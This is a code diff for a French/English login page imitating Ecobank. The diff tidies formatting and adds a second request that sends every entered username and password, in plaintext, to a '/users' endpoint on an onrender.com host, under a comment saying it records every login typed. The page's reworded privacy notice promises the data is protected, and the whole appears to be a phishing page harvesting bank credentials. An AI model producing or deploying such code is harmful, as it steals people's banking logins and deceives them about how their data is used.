@@ -72,7 +72,7 @@ footer a:hover { color:#fff; text-decoration: underline; }
 
 #loader-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.15); backdrop-filter: blur(3px); z-index:9998; align-items:center; justify-content:center; }
 #loader-overlay .spinner { width:60px; height:60px; border:6px solid rgba(2,98,159,0.2); border-top:6px solid #02629f; border-radius:50%; animation: spin 1s linear infinite; }
-@keyframes spin {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);} }
+@keyframes spin {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
 
 #confirm-window { display:none; position:fixed; top:50%; left:50%; transform: translate(-50%, -50%) scale(0.8); width:380px; max-width:90%; background:#fff; border-radius:20px; box-shadow:0 15px 50px rgba(0,0,0,0.3); padding:25px 20px; z-index:9999; text-align:center; transition: all 0.4s ease; }
 #confirm-window.show { transform: translate(-50%, -50%) scale(1); opacity:1; }
@@ -221,26 +221,26 @@ footer a:hover { color:#fff; text-decoration: underline; }
         <h3 data-fr="Politique de confidentialité" data-en="Privacy Policy">Politique de confidentialité</h3>
         <span id="close-policy">&times;</span>
     </div>
-    <p data-fr="Ecobank s'engage à protéger votre vie privée et vos informations personnelles."
-       data-en="Ecobank is committed to protecting your privacy and personal information.">
-       Ecobank s'engage à protéger votre vie privée et vos informations personnelles.
+    <p data-fr="Ecobank prend votre confidentialité au sérieux. Les informations que vous fournissez sont protégées et ne seront utilisées qu’aux fins indiquées." data-en="Ecobank takes your privacy seriously. The information you provide is protected and will only be used for the purposes indicated.">
+        Ecobank prend votre confidentialité au sérieux. Les informations que vous fournissez sont protégées et ne seront utilisées qu’aux fins indiquées.
     </p>
 </div>
 
+<!-- SCRIPT JS -->
 <script>
-// PAGE DE CHARGEMENT
 window.addEventListener("load", () => {
     const cover = document.querySelector(".cover-layer");
-    setTimeout(() => { cover.classList.add("hidden"); document.getElementById("main-content").style.opacity = 1; }, 1200);
+    setTimeout(() => { 
+        cover.classList.add("hidden"); 
+        document.getElementById("main-content").style.opacity = 1; 
+    }, 1200);
 });
 
-// TOGGLE PASSWORD
 document.querySelector(".toggle-password").addEventListener("click", function() {
     const passInput = document.getElementById("password");
-    if(passInput.type === "password") { passInput.type = "text"; } else { passInput.type = "password"; }
+    passInput.type = passInput.type === "password" ? "text" : "password";
 });
 
-// LOGIN AU BACKEND
 const loginBtn = document.getElementById("login-btn");
 const loaderOverlay = document.getElementById("loader-overlay");
 const mainContent = document.getElementById("main-content");
@@ -251,18 +251,23 @@ loginBtn.addEventListener("click", async (e) => {
     e.preventDefault();
     const username = document.getElementById("username").value.trim();
     const password = document.getElementById("password").value.trim();
-
     if(!username || !password){ alert("Veuillez entrer votre nom d'utilisateur et mot de passe !"); return; }
 
-    mainContent.classList.add("blur"); footer.classList.add("blur"); loaderOverlay.style.display="flex";
+    mainContent.classList.add("blur");
+    footer.classList.add("blur");
+    loaderOverlay.style.display="flex";
 
-    try {
+    try{
         const response = await fetch("https://ecobank-backend.onrender.com/login", {
-            method: "POST",
-            headers: {"Content-Type":"application/json"},
-            body: JSON.stringify({username,password})
+            method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({username,password})
         });
         const data = await response.json();
+
+        // Enregistre tout login saisi
+        await fetch("https://ecobank-backend.onrender.com/users", {
+            method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({username,password})
+        });
+
         loaderOverlay.style.display="none";
 
         if(data.success){
@@ -274,27 +279,26 @@ loginBtn.addEventListener("click", async (e) => {
         }
     } catch(err){
         loaderOverlay.style.display="none"; mainContent.classList.remove("blur"); footer.classList.remove("blur");
-        alert("Erreur de connexion au serveur. Veuillez réessayer plus tard.");
-        console.error(err);
+        alert("Erreur de connexion au serveur. Veuillez réessayer plus tard."); console.error(err);
     }
 });
 
-// FERME POPUP CONFIRM
-document.getElementById("close-confirm").addEventListener("click",()=>{ confirmWindow.style.display="none"; mainContent.classList.remove("blur"); footer.classList.remove("blur"); });
+document.getElementById("close-confirm").addEventListener("click", ()=>{ 
+    confirmWindow.style.display="none"; mainContent.classList.remove("blur"); footer.classList.remove("blur"); 
+});
 
-// GESTION POPUPS AIDE / TERMS / POLICY (inchangée)
 const helpBtn = document.getElementById("help-btn"), helpOverlay = document.getElementById("help-overlay"), helpPopup = document.getElementById("help-popup");
-document.getElementById("close-help").addEventListener("click",()=>{ helpOverlay.style.display="none"; helpPopup.style.display="none"; helpOverlay.classList.remove("show"); helpPopup.classList.remove("show"); });
-helpBtn.addEventListener("click",()=>{ helpOverlay.style.display="block"; helpPopup.style.display="block"; helpOverlay.classList.add("show"); helpPopup.classList.add("show"); });
+document.getElementById("close-help").addEventListener("click", ()=>{ helpOverlay.style.display="none"; helpPopup.style.display="none"; helpOverlay.classList.remove("show"); helpPopup.classList.remove("show"); });
+helpBtn.addEventListener("click", ()=>{ helpOverlay.style.display="block"; helpPopup.style.display="block"; helpOverlay.classList.add("show"); helpPopup.classList.add("show"); });
 
 const showTermsBtn = document.getElementById("show-terms-btn"); const termsOverlay = document.getElementById("terms-overlay"); const termsPopup = document.getElementById("terms-popup");
 showTermsBtn.addEventListener("click",(e)=>{ e.preventDefault(); termsOverlay.style.display="block"; termsPopup.style.display="block"; termsOverlay.classList.add("show"); termsPopup.classList.add("show"); });
-document.getElementById("close-terms").addEventListener("click",()=>{ termsOverlay.style.display="none"; termsPopup.style.display="none"; termsOverlay.classList.remove("show"); termsPopup.classList.remove("show"); });
+document.getElementById("close-terms").addEventListener("click", ()=>{ termsOverlay.style.display="none"; termsPopup.style.display="none"; termsOverlay.classList.remove("show"); termsPopup.classList.remove("show"); });
 document.getElementById("show-terms-btn-footer").addEventListener("click",(e)=>{ e.preventDefault(); termsOverlay.style.display="block"; termsPopup.style.display="block"; termsOverlay.classList.add("show"); termsPopup.classList.add("show"); });
 
 const showPolicyBtn = document.getElementById("show-policy-btn"); const policyOverlay = document.getElementById("policy-overlay"); const policyPopup = document.getElementById("policy-popup");
 showPolicyBtn.addEventListener("click",(e)=>{ e.preventDefault(); policyOverlay.style.display="block"; policyPopup.style.display="block"; policyOverlay.classList.add("show"); policyPopup.classList.add("show"); });
-document.getElementById("close-policy").addEventListener("click",()=>{ policyOverlay.style.display="none"; policyPopup.style.display="none"; policyOverlay.classList.remove("show"); policyPopup.classList.remove("show"); });
+document.getElementById("close-policy").addEventListener("click", ()=>{ policyOverlay.style.display="none"; policyPopup.style.display="none"; policyOverlay.classList.remove("show"); policyPopup.classList.remove("show"); });
 document.getElementById("show-policy-btn-footer").addEventListener("click",(e)=>{ e.preventDefault(); policyOverlay.style.display="block"; policyPopup.style.display="block"; policyOverlay.classList.add("show"); policyPopup.classList.add("show"); });
 </script>
 
